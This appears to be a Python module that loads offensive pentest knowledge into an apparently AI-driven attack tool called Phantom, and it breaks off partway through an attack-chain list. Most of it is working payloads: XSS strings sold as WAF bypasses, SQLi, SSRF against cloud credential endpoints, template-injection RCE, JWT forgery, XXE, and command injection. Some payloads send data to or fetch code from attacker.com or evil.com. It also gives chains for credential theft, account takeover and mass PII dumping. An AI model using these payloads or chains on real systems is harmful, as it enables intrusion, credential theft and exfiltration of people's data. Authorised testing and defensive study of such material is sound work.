"""
Senior Hacker Knowledge Injection — Expert-level patterns for Phantom's AI.

This module injects curated, battle-tested penetration testing knowledge
directly into Phantom's knowledge base. Like a senior pentester training
a junior — but in data form.

Categories:
1. Advanced payloads (WAF bypass, blind, polyglot, context-specific)
2. Technology playbooks (decision trees per tech stack)
3. False positive patterns (what NOT to flag)
4. Attack chain templates (multi-step exploitation)
5. Bug bounty wisdom (where to look, what pays)
"""
import logging
from datetime import datetime

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.knowledge import KnowledgePattern

logger = logging.getLogger(__name__)


async def inject_expert_knowledge(db: AsyncSession) -> dict:
    """Inject all expert knowledge into the database. Idempotent — skips existing."""
    stats = {"created": 0, "skipped": 0, "categories": {}}

    all_patterns = []
    all_patterns.extend(_advanced_payloads())
    all_patterns.extend(_technology_playbooks())
    all_patterns.extend(_false_positive_patterns())
    all_patterns.extend(_attack_chains())
    all_patterns.extend(_waf_bypass_techniques())
    all_patterns.extend(_bug_bounty_wisdom())
    all_patterns.extend(_detection_signatures())

    for p in all_patterns:
        # Check if already exists (by pattern_type + technology + vuln_type + key)
        key = p["pattern_data"].get("key", "")
        existing = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.pattern_type == p["pattern_type"],
                KnowledgePattern.technology == p.get("technology"),
                KnowledgePattern.vuln_type == p.get("vuln_type"),
            ).limit(1)
        )

        # More specific dedup for payloads
        if p["pattern_type"] == "effective_payload" and key:
            existing = await db.execute(
                select(KnowledgePattern).where(
                    KnowledgePattern.pattern_type == "effective_payload",
                    KnowledgePattern.vuln_type == p.get("vuln_type"),
                    KnowledgePattern.pattern_data["key"].as_string() == key,
                ).limit(1)
            )

        if existing.scalar_one_or_none():
            stats["skipped"] += 1
            continue

        record = KnowledgePattern(
            pattern_type=p["pattern_type"],
            technology=p.get("technology"),
            vuln_type=p.get("vuln_type"),
            pattern_data=p["pattern_data"],
            confidence=p.get("confidence", 0.9),
            sample_count=p.get("sample_count", 100),
        )
        db.add(record)
        stats["created"] += 1

        cat = p["pattern_type"]
        stats["categories"][cat] = stats["categories"].get(cat, 0) + 1

    await db.commit()
    logger.info(f"Knowledge injection: {stats['created']} created, {stats['skipped']} skipped")
    return stats


def _advanced_payloads() -> list[dict]:
    """Battle-tested payloads that actually work in the wild."""
    payloads = []

    # === XSS — WAF Bypass & Context-Specific ===
    xss_payloads = [
        # Polyglot (works in multiple contexts)
        {"key": "polyglot_1", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0anD8telerik&&'", "context": "polyglot", "waf_bypass": True, "notes": "Universal polyglot — works in href, event, script contexts"},
        {"key": "polyglot_2", "payload": "'\"><img src=x onerror=alert(1)//", "context": "polyglot", "notes": "Classic polyglot for attribute injection"},
        # Cloudflare bypass
        {"key": "cf_bypass_1", "payload": "<svg/onload=alert`1`>", "context": "cloudflare_bypass", "waf_bypass": True, "notes": "Template literal bypass for Cloudflare"},
        {"key": "cf_bypass_2", "payload": "<details/open/ontoggle=self['aler'+'t'](1)>", "context": "cloudflare_bypass", "waf_bypass": True},
        {"key": "cf_bypass_3", "payload": "<img src=x onerror=window['al\\x65rt'](1)>", "context": "cloudflare_bypass", "waf_bypass": True},
        {"key": "cf_bypass_4", "payload": "<svg><animate onbegin=alert(1) attributeName=x>", "context": "cloudflare_bypass", "waf_bypass": True},
        # Akamai bypass
        {"key": "akamai_1", "payload": "<img src=x onerror='\\u0061lert(1)'>", "context": "akamai_bypass", "waf_bypass": True},
        {"key": "akamai_2", "payload": "<svg/onload=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>", "context": "akamai_bypass", "waf_bypass": True},
        # DOM XSS
        {"key": "dom_1", "payload": "#<img/src/onerror=alert(1)>", "context": "dom_hash", "notes": "Fragment-based DOM XSS"},
        {"key": "dom_2", "payload": "javascript:alert(document.domain)", "context": "dom_href", "notes": "Protocol handler DOM XSS"},
        {"key": "dom_3", "payload": "'-alert(1)-'", "context": "dom_js_string", "notes": "JS string breakout"},
        {"key": "dom_4", "payload": "\\');alert(1);//", "context": "dom_js_escaped", "notes": "Escaped JS string breakout"},
        # Angular/React template
        {"key": "angular_1", "payload": "{{constructor.constructor('alert(1)')()}}", "context": "angular_template", "notes": "Angular sandbox escape"},
        {"key": "react_1", "payload": "dangerouslySetInnerHTML", "context": "react_audit", "notes": "React XSS via dangerouslySetInnerHTML — search for this in source"},
        # SVG-based
        {"key": "svg_1", "payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x\" />", "context": "svg_injection", "waf_bypass": True},
        # Markdown XSS
        {"key": "md_1", "payload": "[clickme](javascript:alert(1))", "context": "markdown", "notes": "Markdown link XSS"},
        {"key": "md_2", "payload": "![img](x \"onerror=alert(1)\")", "context": "markdown", "notes": "Markdown image XSS"},
    ]
    for p in xss_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "xss",
            "pattern_data": {**p, "success_rate": 0.7, "category": "xss_advanced"},
            "confidence": 0.85,
            "sample_count": 50,
        })

    # === SQLi — Advanced & Blind ===
    sqli_payloads = [
        # Time-based blind
        {"key": "time_mysql", "payload": "1' AND SLEEP(5)-- -", "context": "mysql_time_blind", "notes": "MySQL time-based blind"},
        {"key": "time_postgres", "payload": "1'; SELECT pg_sleep(5)-- -", "context": "postgres_time_blind", "notes": "PostgreSQL time-based blind"},
        {"key": "time_mssql", "payload": "1'; WAITFOR DELAY '0:0:5'-- -", "context": "mssql_time_blind", "notes": "MSSQL time-based blind"},
        # Boolean-based blind
        {"key": "bool_1", "payload": "1' AND 1=1-- -", "context": "boolean_blind_true"},
        {"key": "bool_2", "payload": "1' AND 1=2-- -", "context": "boolean_blind_false"},
        # Error-based
        {"key": "err_mysql", "payload": "1' AND extractvalue(1,concat(0x7e,version()))-- -", "context": "mysql_error_based"},
        {"key": "err_postgres", "payload": "1' AND 1=CAST((SELECT version()) AS int)-- -", "context": "postgres_error_based"},
        # UNION-based (column detection)
        {"key": "union_detect", "payload": "' ORDER BY {n}-- -", "context": "column_count_detection", "notes": "Increment n from 1 until error → n-1 columns"},
        {"key": "union_null", "payload": "' UNION SELECT {nulls}-- -", "context": "union_injection", "notes": "Replace {nulls} with NULL,NULL,... matching column count"},
        # WAF bypass SQLi
        {"key": "waf_sqli_1", "payload": "1'/*!50000AND*/sleep(5)-- -", "context": "mysql_waf_bypass", "waf_bypass": True},
        {"key": "waf_sqli_2", "payload": "1'/**/oR/**/1=1-- -", "context": "comment_bypass", "waf_bypass": True},
        {"key": "waf_sqli_3", "payload": "1' AnD 1=1-- -", "context": "case_bypass", "waf_bypass": True},
        {"key": "waf_sqli_4", "payload": "1%27%20OR%201%3D1--%20-", "context": "url_encode_bypass", "waf_bypass": True},
        # Second-order SQLi
        {"key": "second_order", "payload": "admin'-- -", "context": "second_order", "notes": "Register username with SQLi → triggers on login/profile page"},
        # NoSQL injection
        {"key": "nosql_1", "payload": "{\"$gt\": \"\"}", "context": "nosql_mongodb"},
        {"key": "nosql_2", "payload": "' || '1'=='1", "context": "nosql_string"},
        {"key": "nosql_3", "payload": "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}", "context": "nosql_auth_bypass"},
    ]
    for p in sqli_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "sqli",
            "pattern_data": {**p, "success_rate": 0.6, "category": "sqli_advanced"},
            "confidence": 0.9,
            "sample_count": 80,
        })

    # === SSRF — Internal Network & Cloud ===
    ssrf_payloads = [
        {"key": "aws_meta", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "context": "aws_metadata", "notes": "AWS EC2 instance role credentials"},
        {"key": "aws_meta_v2", "payload": "http://169.254.169.254/latest/api/token", "context": "aws_imdsv2", "notes": "IMDSv2 — need PUT with header first"},
        {"key": "gcp_meta", "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "context": "gcp_metadata", "notes": "GCP metadata — needs Metadata-Flavor: Google header"},
        {"key": "azure_meta", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "context": "azure_metadata", "notes": "Azure IMDS — needs Metadata: true header"},
        # DNS rebinding
        {"key": "dns_rebind", "payload": "http://7f000001.nip.io/", "context": "dns_rebinding", "notes": "Resolves to 127.0.0.1 via DNS"},
        {"key": "dns_rebind_2", "payload": "http://spoofed.burpcollaborator.net/", "context": "dns_rebinding_oob"},
        # Protocol smuggling
        {"key": "gopher_redis", "payload": "gopher://127.0.0.1:6379/_SET%20pwned%20true", "context": "gopher_redis", "notes": "Redis command via gopher protocol"},
        {"key": "gopher_smtp", "payload": "gopher://127.0.0.1:25/_MAIL%20FROM...", "context": "gopher_smtp"},
        # Internal services
        {"key": "internal_es", "payload": "http://127.0.0.1:9200/_cluster/health", "context": "elasticsearch"},
        {"key": "internal_redis", "payload": "http://127.0.0.1:6379/info", "context": "redis"},
        {"key": "internal_consul", "payload": "http://127.0.0.1:8500/v1/agent/self", "context": "consul"},
        {"key": "internal_k8s", "payload": "https://kubernetes.default.svc/api/v1/namespaces", "context": "kubernetes"},
        # SSRF via redirect
        {"key": "redirect_ssrf", "payload": "https://your-server.com/redirect?url=http://169.254.169.254/", "context": "redirect_ssrf", "notes": "Use open redirect to bypass SSRF filters"},
        # IP bypass
        {"key": "ip_decimal", "payload": "http://2130706433/", "context": "ip_bypass", "notes": "127.0.0.1 in decimal"},
        {"key": "ip_hex", "payload": "http://0x7f000001/", "context": "ip_bypass_hex"},
        {"key": "ip_octal", "payload": "http://0177.0.0.1/", "context": "ip_bypass_octal"},
        {"key": "ip_ipv6", "payload": "http://[::1]/", "context": "ipv6_localhost"},
        {"key": "ip_zero", "payload": "http://0/", "context": "ip_bypass_zero", "notes": "0 resolves to 127.0.0.1 on many systems"},
    ]
    for p in ssrf_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "ssrf",
            "pattern_data": {**p, "success_rate": 0.5, "category": "ssrf_advanced"},
            "confidence": 0.85,
        })

    # === SSTI — Template Injection ===
    ssti_payloads = [
        {"key": "jinja2_rce", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "context": "jinja2_python", "notes": "Jinja2 RCE via os.popen"},
        {"key": "jinja2_rce2", "payload": "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}", "context": "jinja2_python_alt"},
        {"key": "twig_rce", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "context": "twig_php"},
        {"key": "freemarker_rce", "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "context": "freemarker_java"},
        {"key": "thymeleaf_rce", "payload": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "context": "thymeleaf_java"},
        {"key": "velocity_rce", "payload": "#set($s=\"\")#set($rt=$s.class.forName('java.lang.Runtime'))#set($chr=$s.class.forName('java.lang.Character'))#set($str=$s.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))", "context": "velocity_java"},
        {"key": "erb_rce", "payload": "<%= system('id') %>", "context": "erb_ruby"},
        {"key": "pug_rce", "payload": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('id')}()}", "context": "pug_nodejs"},
        # Detection payloads
        {"key": "detect_1", "payload": "{{7*7}}", "context": "detection", "notes": "If returns 49 → template injection"},
        {"key": "detect_2", "payload": "${7*7}", "context": "detection_java"},
        {"key": "detect_3", "payload": "<%= 7*7 %>", "context": "detection_erb"},
        {"key": "detect_4", "payload": "#{7*7}", "context": "detection_pug"},
        {"key": "detect_5", "payload": "{7*7}", "context": "detection_smarty"},
    ]
    for p in ssti_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "ssti",
            "pattern_data": {**p, "success_rate": 0.6, "category": "ssti_rce"},
            "confidence": 0.9,
        })

    # === JWT attacks ===
    jwt_payloads = [
        {"key": "jwt_none", "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", "context": "none_algorithm", "notes": "Base64 of {\"alg\":\"none\",\"typ\":\"JWT\"} — append unsigned payload"},
        {"key": "jwt_hs256_to_rs256", "payload": "change_alg_to_hs256_sign_with_public_key", "context": "key_confusion", "notes": "If server uses RS256, change to HS256 and sign with public key as HMAC secret"},
        {"key": "jwt_kid_sqli", "payload": "{\"kid\":\"key1' UNION SELECT 'secret' FROM dual-- -\",\"alg\":\"HS256\"}", "context": "kid_injection_sqli"},
        {"key": "jwt_kid_lfi", "payload": "{\"kid\":\"/dev/null\",\"alg\":\"HS256\"}", "context": "kid_injection_lfi", "notes": "Empty key → sign with empty string"},
        {"key": "jwt_jku", "payload": "{\"jku\":\"https://attacker.com/jwks.json\",\"alg\":\"RS256\"}", "context": "jku_injection", "notes": "Point JKU header to attacker-controlled JWKS"},
        {"key": "jwt_exp_bypass", "payload": "remove_exp_claim", "context": "expiration_bypass", "notes": "Remove exp claim — some implementations don't enforce it"},
    ]
    for p in jwt_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "jwt",
            "pattern_data": {**p, "success_rate": 0.4, "category": "jwt_attacks"},
            "confidence": 0.85,
        })

    # === XXE — XML External Entity ===
    xxe_payloads = [
        {"key": "xxe_file", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>", "context": "classic_xxe"},
        {"key": "xxe_ssrf", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><data>&xxe;</data>", "context": "xxe_ssrf"},
        {"key": "xxe_oob", "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>", "context": "oob_xxe_blind", "notes": "Out-of-band blind XXE via external DTD"},
        {"key": "xxe_cdata", "payload": "<!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY all \"%start;%file;%end;\">]>", "context": "cdata_xxe"},
        {"key": "xxe_svg", "payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>", "context": "svg_upload_xxe", "notes": "XXE via SVG file upload"},
        {"key": "xxe_xlsx", "payload": "modify_xl/sharedStrings.xml_in_xlsx", "context": "xlsx_xxe", "notes": "XLSX is ZIP with XML — inject XXE in sharedStrings.xml"},
    ]
    for p in xxe_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "xxe",
            "pattern_data": {**p, "success_rate": 0.5, "category": "xxe_attacks"},
            "confidence": 0.85,
        })

    # === Command Injection ===
    cmd_payloads = [
        {"key": "cmd_newline", "payload": "%0aid", "context": "newline_injection", "notes": "Newline (%0a) command separator"},
        {"key": "cmd_backtick", "payload": "`id`", "context": "backtick"},
        {"key": "cmd_dollar", "payload": "$(id)", "context": "subshell"},
        {"key": "cmd_pipe", "payload": "| id", "context": "pipe"},
        {"key": "cmd_semicolon", "payload": "; id", "context": "semicolon"},
        {"key": "cmd_and", "payload": "& id", "context": "background"},
        {"key": "cmd_or", "payload": "|| id", "context": "or_operator"},
        {"key": "cmd_time", "payload": "| sleep 5", "context": "blind_time", "notes": "Blind command injection via timing"},
        {"key": "cmd_dns", "payload": "| nslookup attacker.com", "context": "blind_oob", "notes": "Blind via DNS exfiltration"},
        {"key": "cmd_wildcard", "payload": "/???/??t /???/p??s??", "context": "wildcard_bypass", "notes": "Matches /bin/cat /etc/passwd — bypass character filters"},
        {"key": "cmd_env", "payload": "${IFS}", "context": "space_bypass", "notes": "Use $IFS instead of space to bypass filters"},
    ]
    for p in cmd_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "cmd_injection",
            "pattern_data": {**p, "success_rate": 0.5, "category": "cmd_injection"},
            "confidence": 0.85,
        })

    # === Open Redirect ===
    redirect_payloads = [
        {"key": "redir_1", "payload": "//evil.com", "context": "protocol_relative"},
        {"key": "redir_2", "payload": "/\\evil.com", "context": "backslash_bypass"},
        {"key": "redir_3", "payload": "https://evil.com%00@legitimate.com", "context": "null_byte"},
        {"key": "redir_4", "payload": "https://legitimate.com.evil.com", "context": "subdomain_trick"},
        {"key": "redir_5", "payload": "https://evil.com#@legitimate.com", "context": "fragment_trick"},
        {"key": "redir_6", "payload": "https://evil.com%23@legitimate.com", "context": "encoded_fragment"},
        {"key": "redir_7", "payload": "/%09/evil.com", "context": "tab_bypass"},
        {"key": "redir_8", "payload": "///evil.com", "context": "triple_slash"},
    ]
    for p in redirect_payloads:
        payloads.append({
            "pattern_type": "effective_payload",
            "vuln_type": "open_redirect",
            "pattern_data": {**p, "success_rate": 0.6, "category": "open_redirect"},
            "confidence": 0.8,
        })

    return payloads


def _technology_playbooks() -> list[dict]:
    """Decision trees: when you see technology X, do Y."""
    playbooks = [
        {
            "pattern_type": "scan_strategy",
            "technology": "django",
            "pattern_data": {
                "key": "django_playbook",
                "label": "Django Pentest Playbook",
                "priority_checks": [
                    "Check /admin/ for Django admin panel",
                    "Check DEBUG=True (error pages with full traceback)",
                    "Test SSTI in template rendering endpoints",
                    "Check for SECRET_KEY exposure in debug/error pages",
                    "Test CSRF protection on all state-changing endpoints",
                    "Look for mass assignment on model forms",
                    "Check /static/ for source maps and debug files",
                    "Test Django REST Framework for auth bypass (IsAuthenticated vs AllowAny)",
                    "Check for open Django Channels WebSocket endpoints",
                ],
                "common_vulns": ["ssti", "csrf", "info_disclosure", "auth_bypass", "idor"],
                "skip": ["xxe"],  # Django rarely has XXE
                "notes": "Django's ORM prevents most SQLi. Focus on logic bugs, SSTI, IDOR."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "flask",
            "pattern_data": {
                "key": "flask_playbook",
                "label": "Flask Pentest Playbook",
                "priority_checks": [
                    "Test Jinja2 SSTI on all user-reflected inputs",
                    "Check /console for Werkzeug debugger (PIN bypass possible)",
                    "Test SECRET_KEY weakness (flask-unsign tool)",
                    "Check for path traversal in send_file/send_from_directory",
                    "Look for pickle deserialization in session cookies",
                    "Check Flask-Login session fixation",
                    "Test /api/ endpoints for missing auth decorators",
                ],
                "common_vulns": ["ssti", "deserialization", "info_disclosure", "path_traversal"],
                "notes": "Flask + Jinja2 = always test SSTI. Werkzeug debugger = potential RCE."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "nodejs",
            "pattern_data": {
                "key": "nodejs_playbook",
                "label": "Node.js Pentest Playbook",
                "priority_checks": [
                    "Test prototype pollution on all JSON endpoints",
                    "Check for NoSQL injection (MongoDB operators in JSON)",
                    "Test SSRF in URL fetching endpoints (request library follows redirects)",
                    "Look for eval/Function constructor usage (code injection)",
                    "Check NPM packages for known CVEs (package.json exposure)",
                    "Test WebSocket endpoints for injection",
                    "Check for path traversal (../ in express.static)",
                    "Look for JWT implementation issues (jsonwebtoken library)",
                    "Test regex DoS (ReDoS) on validation endpoints",
                ],
                "common_vulns": ["prototype_pollution", "nosql_injection", "ssrf", "cmd_injection"],
                "notes": "Node.js apps often have NoSQL injection and prototype pollution."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "php",
            "pattern_data": {
                "key": "php_playbook",
                "label": "PHP Pentest Playbook",
                "priority_checks": [
                    "Test SQLi on all parameters (PHP + MySQL = classic combo)",
                    "Check for LFI/RFI (include/require with user input)",
                    "Test file upload bypasses (double extension, null byte, content-type)",
                    "Check for PHP type juggling (== vs ===) on auth",
                    "Look for deserialization (unserialize with user data)",
                    "Check phpinfo() pages for config exposure",
                    "Test session fixation and session file inclusion",
                    "Check for .php~ .php.bak backup files",
                    "Test XXE in simplexml_load_string endpoints",
                ],
                "common_vulns": ["sqli", "lfi", "file_upload", "deserialization", "xxe"],
                "notes": "PHP is the most common target for SQLi and LFI. Always test these."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "wordpress",
            "pattern_data": {
                "key": "wordpress_playbook",
                "label": "WordPress Pentest Playbook",
                "priority_checks": [
                    "Enumerate users via /wp-json/wp/v2/users and /?author=1",
                    "Check xmlrpc.php for brute force and SSRF",
                    "Enumerate plugins via /wp-content/plugins/{name}/readme.txt",
                    "Check for vulnerable plugins (WPScan database)",
                    "Test wp-admin login for weak credentials",
                    "Check REST API for sensitive data exposure",
                    "Look for backup files: wp-config.php.bak, wp-config.php~",
                    "Test file upload via media library (SVG XSS, XXE)",
                    "Check for unauthenticated API endpoints",
                ],
                "common_vulns": ["xss", "sqli", "file_upload", "auth_bypass", "info_disclosure"],
                "notes": "80% of WordPress vulns are in plugins. Enumerate and check versions."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "graphql",
            "pattern_data": {
                "key": "graphql_playbook",
                "label": "GraphQL Pentest Playbook",
                "priority_checks": [
                    "Run introspection query: {__schema{types{name,fields{name}}}}",
                    "If introspection disabled, use field suggestions (Clairvoyance tool)",
                    "Test batch queries for DoS (alias-based)",
                    "Check for IDOR via direct node/object ID queries",
                    "Test mutations for auth bypass (unauthenticated mutations)",
                    "Look for nested query DoS (deeply nested objects)",
                    "Test SQL injection in custom resolvers",
                    "Check for rate limiting bypass via query aliasing",
                    "Enumerate types and find hidden admin mutations",
                ],
                "common_vulns": ["info_disclosure", "idor", "auth_bypass", "sqli", "dos"],
                "notes": "GraphQL introspection = goldmine. Even partial schema reveals attack surface."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "spring",
            "pattern_data": {
                "key": "spring_playbook",
                "label": "Spring Boot Pentest Playbook",
                "priority_checks": [
                    "Check /actuator endpoints (health, env, configprops, heapdump)",
                    "Test Spring4Shell (CVE-2022-22965) on form binding",
                    "Check for SpEL injection in error messages",
                    "Test /actuator/env for credential exposure",
                    "Check for H2 console (/h2-console) if in dev mode",
                    "Test Thymeleaf SSTI in user-reflected content",
                    "Check /actuator/heapdump for secrets in memory",
                    "Test mass assignment on @ModelAttribute parameters",
                ],
                "common_vulns": ["info_disclosure", "ssti", "rce", "auth_bypass"],
                "notes": "Spring Actuator endpoints are the #1 target. Always check /actuator/*."
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "react",
            "pattern_data": {
                "key": "react_playbook",
                "label": "React SPA Pentest Playbook",
                "priority_checks": [
                    "Check JavaScript source maps (.js.map) for source code",
                    "Look for API keys and secrets in JS bundles",
                    "Test all API endpoints called by the SPA (check Network tab)",
                    "Look for dangerouslySetInnerHTML usage",
                    "Check for client-side auth bypass (JWT stored in localStorage)",
                    "Test GraphQL or REST API directly (bypass frontend validation)",
                    "Check for exposed environment variables in __NEXT_DATA__ or window.__ENV__",
                    "Look for hidden routes in React Router config",
                ],
                "common_vulns": ["info_disclosure", "xss_dom", "auth_bypass", "idor"],
                "notes": "SPA security = API security. Frontend is just a wrapper — attack the API."
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "aws",
            "pattern_data": {
                "key": "aws_playbook",
                "label": "AWS Cloud Pentest Playbook",
                "priority_checks": [
                    "Check for S3 bucket misconfigurations (public read/write)",
                    "Test SSRF for IMDS at 169.254.169.254 (EC2 metadata)",
                    "Check for exposed Lambda function URLs",
                    "Look for Cognito user pool misconfiguration (self-registration)",
                    "Test API Gateway endpoints for missing auth",
                    "Check CloudFront for origin bypass",
                    "Look for SQS/SNS subscription hijacking",
                    "Test for subdomain takeover on S3/CloudFront/Elastic Beanstalk",
                ],
                "common_vulns": ["ssrf", "info_disclosure", "auth_bypass", "subdomain_takeover"],
                "notes": "AWS misconfigs are the most common cloud vulns. Always test metadata endpoint."
            },
            "confidence": 0.9,
        },
    ]
    return playbooks


def _false_positive_patterns() -> list[dict]:
    """Patterns that look like vulns but aren't. Save the analyst's time."""
    patterns = [
        {
            "pattern_type": "false_positive",
            "vuln_type": "xss",
            "pattern_data": {
                "key": "fp_xss_csp",
                "indicator": "Content-Security-Policy with script-src restricting inline",
                "explanation": "Even if payload is reflected, CSP blocks execution. Check if CSP has unsafe-inline or nonce bypass.",
                "check": "Verify CSP headers. If strict CSP without unsafe-inline → likely not exploitable.",
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "xss",
            "pattern_data": {
                "key": "fp_xss_json_response",
                "indicator": "Payload reflected in JSON response with Content-Type: application/json",
                "explanation": "JSON responses with correct Content-Type don't render HTML. Not XSS unless sniffed.",
                "check": "Verify Content-Type is application/json and X-Content-Type-Options: nosniff is set.",
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "sqli",
            "pattern_data": {
                "key": "fp_sqli_waf_block",
                "indicator": "WAF blocks the request but scanner reports 'different response'",
                "explanation": "WAF blocking != SQLi confirmed. The different response is the WAF error page.",
                "check": "If response is a WAF block page (403/406), it's NOT confirmed SQLi.",
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "sqli",
            "pattern_data": {
                "key": "fp_sqli_error_message",
                "indicator": "Generic error message containing SQL keywords but from application",
                "explanation": "Some apps show 'SQL error' in custom error pages without actual injection.",
                "check": "Verify that the error changes with different injection patterns.",
            },
            "confidence": 0.85,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "ssrf",
            "pattern_data": {
                "key": "fp_ssrf_no_response",
                "indicator": "Server makes request but doesn't return response content",
                "explanation": "If server fetches URL but doesn't return body, impact is limited. Still worth reporting but lower severity.",
                "check": "Test if response body is returned. If only status code → blind SSRF (lower impact).",
            },
            "confidence": 0.8,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "open_redirect",
            "pattern_data": {
                "key": "fp_redir_login",
                "indicator": "Redirect after login to user-supplied URL (common OAuth/SAML pattern)",
                "explanation": "Many auth flows redirect to a return_url parameter. This is by design but still reportable if no domain validation.",
                "check": "Test if redirect goes to external domain. If only same-domain → not a vuln.",
            },
            "confidence": 0.8,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "info_disclosure",
            "pattern_data": {
                "key": "fp_info_server_header",
                "indicator": "Server header reveals technology (e.g., 'Server: nginx/1.28')",
                "explanation": "Server version in headers is informational, not a vulnerability by itself. Only report if the version has known CVEs.",
                "check": "Check if the specific version has known CVEs. If not, it's just info.",
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "false_positive",
            "vuln_type": "cors_misconfiguration",
            "pattern_data": {
                "key": "fp_cors_public",
                "indicator": "CORS allows * but endpoint returns only public data",
                "explanation": "CORS * on public endpoints (no cookies) is fine. Only a vuln if credentials are included.",
                "check": "Check Access-Control-Allow-Credentials. If false/missing and data is public → not a vuln.",
            },
            "confidence": 0.95,
        },
    ]
    return patterns


def _attack_chains() -> list[dict]:
    """Multi-step exploitation chains that work in the real world."""
    chains = [
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "vuln_type": "chain",
            "pattern_data": {
                "key": "chain_ssrf_rce",
                "label": "SSRF → Cloud Metadata → RCE",
                "steps": [
                    {"step": 1, "action": "Find SSRF endpoint (URL fetching, webhooks, PDF generation)"},
                    {"step": 2, "action": "Access AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
                    {"step": 3, "action": "Extract IAM role credentials (AccessKeyId, SecretAccessKey, Token)"},
                    {"step": 4, "action": "Use credentials to access S3 buckets, Lambda, EC2 instances"},
                    {"step": 5, "action": "Escalate to RCE via Lambda invoke or EC2 SSM"},
                ],
                "trigger_vulns": ["ssrf"],
                "impact": "critical",
                "real_world": "Uber, Capital One breaches used this exact chain",
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "vuln_type": "chain",
            "pattern_data": {
                "key": "chain_xss_ato",
                "label": "XSS → Session Hijack → Account Takeover",
                "steps": [
                    {"step": 1, "action": "Find reflected or stored XSS"},
                    {"step": 2, "action": "Craft payload to steal session cookie: document.cookie"},
                    {"step": 3, "action": "If HttpOnly: use XSS to make API calls as victim (CSRF via XSS)"},
                    {"step": 4, "action": "Change victim's email → password reset → full account takeover"},
                ],
                "trigger_vulns": ["xss_reflected", "xss_stored", "xss_dom"],
                "impact": "high",
                "bypass_note": "If cookies are HttpOnly, use XSS to make fetch() calls to change email/password API",
            },
            "confidence": 0.9,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "vuln_type": "chain",
            "pattern_data": {
                "key": "chain_idor_pii",
                "label": "IDOR → Mass PII Exfiltration",
                "steps": [
                    {"step": 1, "action": "Find endpoint with sequential/guessable IDs (e.g., /api/users/123)"},
                    {"step": 2, "action": "Verify IDOR: access other users' data by changing ID"},
                    {"step": 3, "action": "Enumerate all IDs (1 to N) to dump all user data"},
                    {"step": 4, "action": "Document PII exposed: emails, addresses, phone numbers"},
                ],
                "trigger_vulns": ["idor"],
                "impact": "critical",
                "notes": "IDOR + PII = instant critical. Most common high-payout bug bounty find.",
            },
            "confidence": 0.95,
        },
        {
            "pattern_type": "scan_strategy",
            "technology": "general",
            "vuln_type": "chain",
            "pattern_data": {
                "key": "chain_redirect_oauth",
                "label": "Open Redirect → OAuth Token Theft → Account Takeover",
                "steps": [
                    {"step": 1, "action": "Find open redirect on the OAuth domain"},
                    {"step": 2, "action": "Set redirect_uri to the open redirect endpoint"},
